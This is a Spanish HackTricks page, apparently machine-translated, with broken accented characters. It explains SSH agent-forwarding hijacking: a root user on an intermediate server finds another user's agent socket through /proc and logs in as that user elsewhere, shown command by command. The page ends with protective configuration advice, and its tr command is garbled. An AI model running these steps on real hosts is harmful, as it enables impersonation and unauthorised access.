<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Resumen

¬øQu√© puedes hacer si descubres dentro del archivo de configuraci√≥n `/etc/ssh_config` o dentro de `$HOME/.ssh/config` lo siguiente:
```
ForwardAgent yes
```
Si eres root dentro de la m√°quina, probablemente puedas **acceder a cualquier conexi√≥n ssh realizada por cualquier agente** que encuentres en el directorio _/tmp_

Suplantar a Bob usando uno de los ssh-agent de Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## ¬øPor qu√© funciona esto?

Cuando configuras la variable `SSH_AUTH_SOCK` est√°s accediendo a las claves de Bob que han sido utilizadas en la conexi√≥n ssh de Bob. Entonces, si su clave privada a√∫n est√° all√≠ (normalmente lo estar√°), podr√°s acceder a cualquier host us√°ndola.

Como la clave privada se guarda en la memoria del agente sin cifrar, supongo que si eres Bob pero no conoces la contrase√±a de la clave privada, a√∫n puedes acceder al agente y usarlo.

Otra opci√≥n es que el usuario propietario del agente y root puedan acceder a la memoria del agente y extraer la clave privada.

# Explicaci√≥n larga y explotaci√≥n

**Tomado de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Cuando ForwardAgent No Puede Ser Confiable**

SSH sin contrase√±as facilita la vida con sistemas operativos similares a Unix. Si tu red requiere sesiones ssh encadenadas (para acceder a una red restringida, por ejemplo), el reenv√≠o de agente se vuelve extremadamente √∫til. Con el reenv√≠o de agente es posible conectarse desde mi port√°til a mi servidor de desarrollo y desde all√≠ ejecutar un svn checkout de otro servidor, todo sin contrase√±as, mientras mantengo mi clave privada segura en mi estaci√≥n de trabajo local.

Sin embargo, esto puede ser peligroso. Una r√°pida b√∫squeda en la web revelar√° varios art√≠culos que indican que esto solo es seguro si los hosts intermedios son confiables. Raramente, sin embargo, encontrar√°s una explicaci√≥n de _por qu√©_ es peligroso.

Eso es lo que este art√≠culo pretende explicar. Pero primero, algo de contexto.

## **C√≥mo Funciona la Autenticaci√≥n Sin Contrase√±a**

Cuando te autenticas en modo normal, SSH usa tu contrase√±a para probar que eres quien dices ser. El servidor compara un hash de esta contrase√±a con uno que tiene en archivo, verifica que los hashes coincidan y te permite entrar.

Si un atacante logra romper el cifrado utilizado para proteger tu contrase√±a mientras se env√≠a al servidor, pueden robarla e iniciar sesi√≥n como t√∫ cuando lo deseen. Si a un atacante se le permite realizar cientos de miles de intentos, eventualmente pueden adivinar tu contrase√±a.

Un m√©todo de autenticaci√≥n mucho m√°s seguro es la [autenticaci√≥n con clave p√∫blica](http://www.ibm.com/developerworks/library/l-keyc/index.html), una forma de iniciar sesi√≥n sin contrase√±a. La autenticaci√≥n con clave p√∫blica requiere un par de claves p√∫blica y privada que coincidan. La clave p√∫blica cifra mensajes que solo pueden ser descifrados con la clave privada. La computadora remota usa su copia de tu clave p√∫blica para cifrar un mensaje secreto para ti. Demuestras que eres t√∫ descifrando el mensaje usando tu clave privada y enviando el mensaje de vuelta a la computadora remota. Tu clave privada permanece segura en tu computadora local todo el tiempo, a salvo de ataques.

La clave privada es valiosa y debe ser protegida, por lo que por defecto se almacena en un formato cifrado. Desafortunadamente, esto significa ingresar tu frase de paso de cifrado antes de usarla. Muchos art√≠culos sugieren usar claves privadas sin frase de paso (sin cifrar) para evitar esta inconveniencia. Esa es una mala idea, ya que cualquiera con acceso a tu estaci√≥n de trabajo (a trav√©s de acceso f√≠sico, robo o hackeo) ahora tambi√©n tiene acceso libre a cualquier computadora configurada con tu clave p√∫blica.

OpenSSH incluye [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), un demonio que se ejecuta en tu estaci√≥n de trabajo local. Carga una copia descifrada de tu clave privada en la memoria, por lo que solo tienes que ingresar tu frase de paso una vez. Luego proporciona un [socket](http://en.wikipedia.org/wiki/Unix_domain_socket) local que el cliente ssh puede usar para pedirle que descifre el mensaje cifrado enviado por el servidor remoto. Tu clave privada permanece segura en la memoria del proceso ssh-agent mientras a√∫n te permite moverte por ssh sin escribir contrase√±as.

## **C√≥mo Funciona ForwardAgent**

Muchas tareas requieren "encadenar" sesiones ssh. Considera mi ejemplo anterior: me conecto por ssh desde mi estaci√≥n de trabajo al servidor de desarrollo. Mientras estoy all√≠, necesito realizar una actualizaci√≥n svn, utilizando el protocolo "svn+ssh". Dado que ser√≠a absurdo dejar una copia sin cifrar de mi clave privada supersecreta en un servidor compartido, ahora estoy atascado con la autenticaci√≥n por contrase√±a. Sin embargo, si habilit√© "ForwardAgent" en la configuraci√≥n ssh de mi estaci√≥n de trabajo, ssh usa sus capacidades de t√∫nel incorporadas para crear otro socket en el servidor de desarrollo que est√° tunelizado de vuelta al socket del ssh-agent en mi estaci√≥n de trabajo local. Esto significa que el cliente ssh en el servidor de desarrollo ahora puede enviar solicitudes de "descifra este mensaje secreto" directamente de vuelta al ssh-agent que se ejecuta en mi estaci√≥n de trabajo, autentic√°ndose ante el servidor svn sin tener acceso a mi clave privada.

## **Por Qu√© Esto Puede Ser Peligroso**

En pocas palabras, cualquiera con privilegios de root en el servidor intermedio puede hacer uso libre de tu ssh-agent para autenticarse en otros servidores. Una demostraci√≥n simple muestra lo trivial que puede ser hacer esto. Los nombres de host y usuarios han sido cambiados para proteger a los inocentes.

Mi port√°til est√° ejecutando ssh-agent, que se comunica con los programas cliente ssh a trav√©s de un socket. La ruta a este socket se almacena en la variable de entorno SSH_AUTH_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
El programa [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nos permite ver e interactuar con las claves en el agente:
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Tengo "ForwardAgent yes" en el \~/.ssh/config de mi port√°til. Por lo tanto, ssh va a crear un t√∫nel conectando el socket local a un socket local en el servidor remoto:
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Aunque mis claves no est√°n instaladas en "seattle", los programas cliente ssh a√∫n pueden acceder al agente que se ejecuta en mi m√°quina local:
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Entonces... ¬øcon qui√©n podemos meternos?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Nunca me ha gustado Bob. Para encontrar su conexi√≥n de agente, necesito encontrar el proceso hijo de una de sus sesiones ssh:
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Hay varias maneras para que root vea el entorno de un proceso en ejecuci√≥n. En Linux, los datos est√°n disponibles en /proc/\<pid>/environ. Dado que se almacenan en cadenas terminadas en NULL, usar√© tr para convertir los NULL en saltos de l√≠nea:
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Ahora tengo todo lo que necesito para secuestrar el ssh-agent de Bob:
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Si tengo un objetivo espec√≠fico en mente, ahora deber√≠a poder conectarme directamente. De lo contrario, simplemente observar la lista de procesos o buscar en el archivo de historial de Bob deber√≠a presentar muchas oportunidades de objetivo. En este caso, s√© que Bob tiene todo tipo de archivos super secretos almacenados en el servidor llamado "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **¬°Prot√©gete!**

No permitas que tu ssh-agent almacene tus claves indefinidamente. En OS X, configura tu Keychain para que se bloquee despu√©s de inactividad o cuando tu pantalla se bloquee. En otras plataformas Unix, pasa la opci√≥n -t a ssh-agent para que sus claves se eliminen despu√©s de segundos.

No habilites el reenv√≠o de agente al conectarte a hosts no confiables. Afortunadamente, la sintaxis de \~/.ssh/config hace esto bastante simple:
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **Lecturas Recomendadas**

* [Gesti√≥n de claves OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) ‚Äì Daniel Robbins
* [Gu√≠a Ilustrada para el Reenv√≠o de Agente SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) ‚Äì Steve Friedl
* [manual de ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [manual de ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
